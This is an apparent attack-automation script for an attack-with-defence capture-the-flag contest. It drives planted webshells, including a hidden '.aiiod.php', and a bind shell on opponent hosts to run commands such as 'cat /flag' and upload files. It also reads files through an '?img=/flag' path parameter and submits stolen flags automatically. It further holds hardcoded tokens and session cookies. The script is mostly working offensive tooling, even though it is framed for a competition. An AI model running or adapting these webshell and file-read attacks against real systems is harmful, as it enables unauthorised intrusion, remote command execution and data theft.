#import aiohttp
import core.logger as logger
from core.connector.ssh import SSHConnector
from core.connector.webshell import WebShellConnector
from core.connector.database import DBConnector
from core.connector.bindtcpshell import BindShellConnector
from misc.persistence import *
from core.submit import Submiter
import core.logger as logger
from core.utils import ignore_errors

from threading import Thread
import threading
import socket
import re
import time
import requests

IP = '192.168.64.1'
TARGET_IPS = [f'192.168.64.{i}' for i in range(125, 129)]
SUBMIT_URL = 'https://127.0.0.1/Common/awd_sub_answer'
TOKEN = '8a7353476166b82201fc6e9799c94f4d'
FLAG_PATH = '/flag'
MY_SERVERS = ['172.0.0.1', '172.0.0.2']


# ichunqiu AWD
def submit_flag_fn(**kw) -> bool:
    d = {
        'answer': kw['flag'],
        'token': '8a7353476166b82201fc6e9799c94f4d',
    }
    r = requests.post(SUBMIT_URL, data=d, verify=0)
    if b'Err:100F' not in r.content:
        logger.success('ok: ' + kw['flag'])
        return True
    else:
        logger.error('err: ' + kw['flag'])
        return False


submiter = Submiter(submit_flag_fn)


def preload():
    for ip in MY_SERVERS:
        s = SSHConnector(ip, 'ctf', '123456')
        s.upload_file('scripts/file-protect.py', '/var/www/html/f.py')
        s.upload_file('scripts/log.php', '/var/www/html/log.php')
        s.exec('echo \'ctf:000000\' | chpasswd')
        s.interactive()


def _a_fn(ip):
    s = BindShellConnector('127.0.0.1', 4444)
    print(s.exec('whoami'))


def _a_fn1(ip):
    w = WebShellConnector(f'http://{ip}:80/shell.php', 'aiiod', method='POST')
    flag = w.exec(f'cat /flag')
    w.upload('aiiod.py', '/var/www/html/xxxxxxxxx')
    return
    if flag and len(flag) < 50:
        submiter.add_flag(flag)


def _a_nodie(ip):
    w = WebShellConnector(f'http://{ip}:80/.aiiod.php', 'aiiod')
    flag = w.exec(f'whoami')
    submiter.add_flag(flag)


def _aa_fn2(ip):
    r = requests.get(f'http://{ip}/?img=/flag', timeout=5)
    submiter.add_flag({'flag': r.text})
    return


attack_funcs = [
    ignore_errors(globals()[func]) for func in globals()
    if func.startswith('_a_')
]
"""
# 易霖博AWD提交flag处理验证码
def submit_flag_fn(**kw) -> bool:
    url = 'http://IP/race.php/melee/sub_flag?scenes_id=8&id=34&module_id=4'

    headers = {
        'Cookie':
        'PHPSESSID=q2bdvr6i7rh2868od48ao1p4s7; _csrf=3dee1f4a75de55221aad3e7500ce1af447e6bd961181e5b5206038ad57754e46a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Oo78JG56bm0Uo3GFDBlPZvpep8Oo1kqE%22%3B%7D; __user_identity=b05cd6768e36ebe4fc5c32592451f0cdd79a78b94d27d0ee3e6fdc2be0f7852fa%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22__user_identity%22%3Bi%3A1%3Bs%3A18%3A%22%5B510%2Cnull%2C2592000%5D%22%3B%7D'
    }

    s = requests.Session()
    s.headers.update(headers)
    r = s.get(url, headers=headers)
    data = r.text
    _csrf = re.findall(
        r'\<meta name\="csrf-token" content\="([a-zA-Z0-9\=\/\+]+)"\>', data)
    _csrf = _csrf[0] if _csrf else ''

    if not _csrf:
        logger.error('get csrf error')
        return False

    files = {
        '_csrf': (None, _csrf, None),
        'melee_ip': (None, kw['ip'], None),
        'melee_flag': (None, kw['flag'], None),
        'VerifyCode[file]': (None, '', None),
        'VerifyCode[file]': '',
        'VerifyCode[verifyCode]': (None, 'HEACBE', None),
        'btn-Submit': (None, '', None),
    }
    r = s.post(url, files=files, headers=headers)  # diy the request
    data = r.text  # diy the response type

    msg = re.findall(r'\$\("\.message\-tishi"\)\.html\(\'(.+)\'\);', data)
    msg = msg[0] if msg else ''

    success = '恭喜您答对了' in data  # diy the condition
    if success:
        logger.success(f'attack {ip} ok: {flag} {msg}')
    else:
        logger.error(f'attack {ip} fail: {flag} {msg}')
    return success
"""